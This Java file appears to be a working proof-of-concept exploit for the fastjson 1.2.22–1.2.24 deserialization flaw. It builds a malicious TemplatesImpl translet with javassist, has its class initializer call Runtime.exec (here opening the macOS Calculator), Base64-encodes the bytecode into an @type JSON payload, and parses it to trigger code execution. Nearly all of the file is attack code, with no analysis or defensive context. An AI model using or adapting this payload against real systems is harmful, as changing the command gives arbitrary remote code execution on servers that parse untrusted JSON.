import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

import java.io.*;

//@dependency{fastjson:1.2.22-1.2.24}
public class templatesimpl {
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}


        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
    }

    public static void main(String[] args) throws Exception{

        String command = "/Applications/Calculator.app/Contents/MacOS/Calculator";
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());

        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);

        byte[] classBytes = clazz.toBytecode();

        String bytes1 = Base64.encodeBase64String(classBytes);
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+bytes1+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";

        Object res = JSON.parse(text1, Feature.SupportNonPublicField);


    }
}
